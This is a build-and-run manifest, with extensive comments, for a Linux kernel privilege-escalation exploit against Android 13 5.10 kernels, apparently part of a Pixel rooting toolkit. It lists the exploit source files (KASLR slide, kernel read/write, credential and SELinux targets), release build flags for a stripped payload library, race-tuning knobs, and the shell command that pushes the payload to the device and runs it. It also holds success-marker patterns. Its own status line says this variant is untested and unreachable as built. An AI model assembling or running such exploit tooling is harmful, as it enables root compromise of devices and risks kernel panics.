# entry.ghostlock@5.10 — GhostLock entry, android13-5.10 variant.
#
# UNVERIFIED ON HARDWARE, but not unverified as to the bug. The fix rewrites
# remove_waiter() in kernel/locking/rtmutex.c to take the task from
# waiter->task; the tree this build names in its own uname (kernel/common @
# 776d0a76f6aa) still clears current->pi_blocked_on and contains no
# waiter_task at all -- character-for-character what panther's gbd23337e42e7
# has, and panther is hardware-verified exploitable. So the bug is open here.
#
# What no one has done is RUN it. The route constants below came from the 6.1
# raven header rather than from measurement, and a lost race panics the phone.
# cves/cve-2026-43499-ghostlock/510-probe.sh checks the device-side
# preconditions the source cannot speak for.
#
# It compiles the SAME sources as entry.ghostlock@6.1 -- src/61/*. That is the
# finding, not a shortcut: the 5.10 deltas that looked like they needed a third
# source set (no kmalloc-cg row, a shorter rt_mutex_waiter, configfs without
# iter ops) all turned out to be target-header constants or stores that land in
# a gap of our own buffer. See the comments in pipe.c, util.c and common.h.
#
# What is NOT derived and was inherited from the 6.1 raven header:
# PSELECT_WAITER_WORD_SHIFT.
# Those are route choices measured per flavour, and nobody has measured them
# here.

schema = 1
kind   = "entry"
id     = "entry.ghostlock@5.10"
cve    = "CVE-2026-43499"
kmi    = ["android13-5.10"]

composed = true
status   = "composed; DERIVED, NEVER RUN, AND NOT REACHABLE AS BUILT -- the bug is open in this build's own tree (remove_waiter() unfixed, character-for-character as on panther) and the offsets come from its public OTA, but neither reclaim vehicle can be used: tcp-zc needs struct tcp_zerocopy_receive fields that arrive in 5.14 (refused by ARCH-G9-APPLIES), and the pselect overlay cannot reach the waiter, which this build's own Image places 24 words below stack_fds (PSELECT_WAITER_WORD_SHIFT -26, outside the placeable window)"

[build]
form    = "preload-so"
entry   = "constructor"
# Order is load-bearing (STT_FILE order + .rodata string-merge order).
sources = [
  "cves/cve-2026-43499-ghostlock/61/main.c",
  "cves/cve-2026-43499-ghostlock/61/util.c",
  "cves/cve-2026-43499-ghostlock/61/slide61.c",
  "cves/kaslr/slide_tracefs.c",
  "cves/cve-2026-43499-ghostlock/61/fops.c",
  "cves/cve-2026-43499-ghostlock/61/pipe.c",
  "cves/cve-2026-43499-ghostlock/61/root.c",
  "cves/cve-2026-43499-ghostlock/61/preload.c",
]
# The 61/ include dir comes first, then the 6.6 dir, then cves/.  61/ has no
# offset.h and no targets/, so offset.h and targets/<t>/target.h resolve through
# those; the family header resolves through the including file's own directory.
includes = ["cves/cve-2026-43499-ghostlock/61", "cves/cve-2026-43499-ghostlock", "cves"]
depends  = ["cves/cve-2026-43499-ghostlock/61/common.h", "cves/cve-2026-43499-ghostlock/61/kernelsnitch/*.h"]
defines  = ["APP_PAYLOAD=1"]
# @OPT@ is substituted with `opt` below.  The app and release variants share one
# flag list.
cflags   = ["-fPIC", "@OPT@", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-sign-compare"]
opt      = ["-O2", "-g0"]
ldflags  = ["-shared", "-pthread"]
output   = "cve-2026-43499-app"

# The artifact runner/scripts/build-payloads.sh actually ships.
[build.release]
opt     = ["-Oz", "-g0", "-fno-unwind-tables", "-fno-asynchronous-unwind-tables",
           "-ffunction-sections", "-fdata-sections"]
ldflags = ["-shared", "-pthread", "-Wl,--gc-sections", "-Wl,--icf=all", "-s"]
output  = "cve-2026-43499-app.release"

[facts]
header = "cves/targets/{target}/target.h"
requires = [
  "OFFSET_H", "BUILD_VARIANT_LABEL", "BUILD_FINGERPRINT",
  "INIT_TASK", "INIT_TASK_OFF",
  "ASHMEM_MISC_FOPS", "ASHMEM_MISC_FOPS_OFF", "ASHMEM_FOPS", "ASHMEM_IOCTL",
  "KMALLOC_CACHES", "KMALLOC_CACHES_OFF",
  "P0_PAGE_OFFSET", "P0_PHYS_OFFSET", "P0_KERNEL_PHYS_LOAD", "KIMAGE_TEXT_BASE",
  "PIPE_BUFFER_SIZE", "PIPE_BUFFER_SLOTS",
  "SLIDE_INIT_TASK_IMAGE", "SLIDE_LOGGERS_0_1_IMAGE", "SLIDE_SYSCTL_BOOTID_IMAGE",
  "TASK_CRED_OFF", "TASK_REAL_CRED_OFF", "CRED_UID_OFF",
  "SELINUX_ENFORCING", "SECURITY_HOOK_HEADS",
  # The 6.1 discriminators; 61/common.h #ifndef-guards all seven, so
  # requiring them here rejects a 6.6 header.
  "MM_STRUCT_SZ", "KMALLOC_CGROUP_TYPE", "KMALLOC_CACHE_TYPES",
  "KMALLOC_PIPE_INDEX", "PSELECT_WAITER_WORD_SHIFT",
  "RECLAIM_VEHICLE_DEFAULT",
  "KERNEL_VERSION_CODE",
]
forbids = []
# Present on akita only; it is the one device that would say 8.  Optional:
# absence falls back to 61/common.h:73.
optional = ["KSNITCH_COLLISIONS", "SLIDE_LOGGER_PARENT"]

[properties]
retry_safe  = true
panic_risk  = { pre_slide = "high", post_slide = "none" }
destructive = ["slide_logger_parent_slot", "ashmem_miscs[0].fops"]
restores    = ["repair_logger_slot", "restore_fops_ptr_and_owner"]
provides    = ["CAP_SLIDE", "CAP_KRW_C"]
requires_caps = []
retains     = ["CAP_KRW_C"]

# The de-facto [tunables]
[tunables]
RECLAIM_VEHICLE = { type = "enum", values = ["pselect", "tcp-zc"], default_fact = "RECLAIM_VEHICLE_DEFAULT", requires = { "tcp-zc" = "KERNEL_VERSION_CODE >= 0x050e00" }, help = "which syscall re-occupies the freed rt_mutex_waiter frame" }
PSELECT_SHIFT = { type = "int", domain = "pselect_shift_window", default_fact = "PSELECT_WAITER_WORD_SHIFT", applies_when = "RECLAIM_VEHICLE=pselect", help = "the stack_fds word the freed waiter is assumed to land on" }
PAGE_GEOMETRY = { type = "enum", values = ["pselect", "tcp"], help = "sprayed page geometry; entailed by RECLAIM_VEHICLE, so it has no default_fact — set it only to test a deliberate cross-pairing" }
MAIN_TCP_ROUTE_ATTEMPTS = { type = "int", min = 1, max = 1000000 }
MAIN_TCP_ROUTE_DELAY_USEC = { type = "int", min = 0, max = 1000000 }
MAIN_TCP_ROUTE_ARM_SEQ = { type = "int", min = 1, max = 1000000 }
MAIN_TCP_PAGE_ATTEMPTS = { type = "int", min = 1, max = 1000 }
MAIN_TCP_CFI_ATTEMPTS_PER_PAGE = { type = "int", min = 1, max = 1000 }
MAIN_TCP_POST_GETSOCKOPT_HOLD = { type = "int", min = 0, max = 1000000 }
MAIN_TCP_RETRY_PIPE_GEOM = { type = "bool" }
MAIN_TCP_TASK_SLIDE_INIT = { type = "bool" }
MAIN_TCP_LOG_EACH = { type = "bool" }
PSELECT_PAGE_ATTEMPTS = { type = "int", min = 1, max = 1000, applies_when = "RECLAIM_VEHICLE=pselect", help = "outer loop: how many times the kernel page is re-sprayed" }
PSELECT_ROUTE_ATTEMPTS = { type = "int", min = 1, max = 1000000, applies_when = "RECLAIM_VEHICLE=pselect", help = "inner loop: pselect windows per sprayed page" }
PSELECT_CFI_MISSES_PER_PAGE = { type = "int", min = 1, max = 100000, applies_when = "RECLAIM_VEHICLE=pselect", help = "failed cfi stages tolerated on one page before it is re-sprayed" }
PSELECT_TIMEOUT_USEC = { type = "int", min = 1000, max = 5000000, applies_when = "RECLAIM_VEHICLE=pselect", help = "how long one window holds the overlay on the kernel stack" }
PSELECT_ROUTE_DELAY_USEC = { type = "int", min = -1, max = 1000000 }
PSELECT_CONSUMER_NICE_VALUE = { type = "int", min = -20, max = 19 }
PSELECT_ACCEPT_NONREADY_CFI = { type = "bool" }
CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK = { type = "bool" }

# Env the RUNNER injects, not knobs an operator passes. Listed so the set is
# complete and so --tunable cannot shadow one: render_invoke() puts the base in
# ahead of any tunable, and these names are refused as --tunable.
runner_supplied = ["KASLR_BASE", "KASLR_LEAK_ONLY", "RMG_CLIENT_UID",
                   "RMG_APP_UID", "CVE43499_ROOT_HELPER"]

# The pselect fd_set word map, in one place.
#
# core_sys_select() takes nfds and allocates a 256-byte stack_fds; the three
# input bitmaps are words 0..3*ceil(nfds/64)-1 and the result sets follow,
# kernel-zeroed. The waiter word map's first entry is `first_word` and its last
# load-bearing one (`lock`) is `lock_word`, so the legal PSELECT_SHIFT range is
# [-first_word, 3*ceil(nfds/64)-1 - lock_word]. The C gets all of it as -D:
# PSELECT_ROUTE_NFDS, PSELECT_MAP_FIRST_WORD, PSELECT_MAP_LOCK_WORD and the
# derived KNOB_PSELECT_SHIFT_MIN / KNOB_PSELECT_SHIFT_MAX. Change nfds or the
# map here and both the payload's gate and the runner's validation follow.
[pselect_map]
nfds = 320
first_word = 2
lock_word = 9

# ---------------------------------------------------------------------------
# The runner contract — runner/README.md, "Foreign-chain contract"
# ---------------------------------------------------------------------------
# The four tables below restate runner/lib/exploit.sh's built-in defaults as
# data.  ./pixel-ksu-root with no --recipe reads no manifest; `--recipe
# ghostlock` reads this block.

[invoke]
# A .so dlopen'ed by `cve-helper --run-payload`
# (cves/cve-2026-43499-ghostlock/su_daemon.c:975-1026, dispatched at :1028).
kind = "helper-preload"

# The payload the runner pushes is a prebuilt .so chosen out of
# artifacts/exploits/ by runner/lib/select.sh from data/targets.json — a device
# can resolve to a payload built for a different codename on the same kernel.
artifact_source = "runner"
dest = "/data/local/tmp/exploit-payload.so"
mode = "755"

# Generated from the _INVOKE_TMPL_DEFAULT literal in runner/lib/exploit.sh.
command = "cd @DEV_TMP@; @KASLR_ENV@RMG_CLIENT_UID=@CLIENT_UID@ RMG_APP_UID=@APP_UID@        @DEV_HELPER@ --run-payload @DEV_PAYLOAD@ @DEV_HELPER@ @DEV_LOG@ >/dev/null 2>&1"

# A base cached for the current boot is replayed through @KASLR_ENV@
# (cves/cve-2026-43499-ghostlock/61/main.c:275-286).
accepts_base = true

# The default MARK_* set of runner/lib/exploit.sh, as data.  The live classes for
# GhostLock are PANIC, REFUSED, PASS, MISS and PARKED; the classifier is driven
# by these patterns.
[markers]
pass         = 'slide-kaslr(-tracefs)?-ok pid=[0-9]+ base=[0-9a-f]+'
gate_fail    = '[A-Z][A-Z0-9_]*_GATE_FAIL'
restore_pass = '[A-Z][A-Z0-9_]*_RESTORE_PASS'
restore_bad  = '[A-Z][A-Z0-9_]*_(RESTORE_NOT_PROVEN|RESTORE_UNREACHABLE|RESTORE_FAIL)'
# Declared so the kill gate stays correct.  Absent, a deadline parks.
heartbeat    = '[A-Z][A-Z0-9_]*_HEARTBEAT[[:space:]]+seq=[0-9]+'
# The route summary discriminates "reached root" from "did not"; the count is
# cfi-miss LINES, one per page that took a miss.
diag         = '(tcp|pselect) route done=[0-9]+[^\n]*'
diag_count   = 'cfi misses=[0-9]+'

# Empty: cve-helper's early bails return `errno ? errno : <fixed>`
# (cves/cve-2026-43499-ghostlock/su_daemon.c:1000-1010), so no exit status of
# this loader carries an outcome.
[exit_map]

# The KASLR base, from the `pass` marker above.
[provides]
caps  = ["CAP_SLIDE", "CAP_KRW_C"]
field = 'base=[0-9a-f]+'
label = "base"

# Setup, run before each shot. GhostLock's reclaim race is far easier on a
# freshly booted device, so its one setup step is a reboot to a clean boot.
[[setup]]
reboot = true
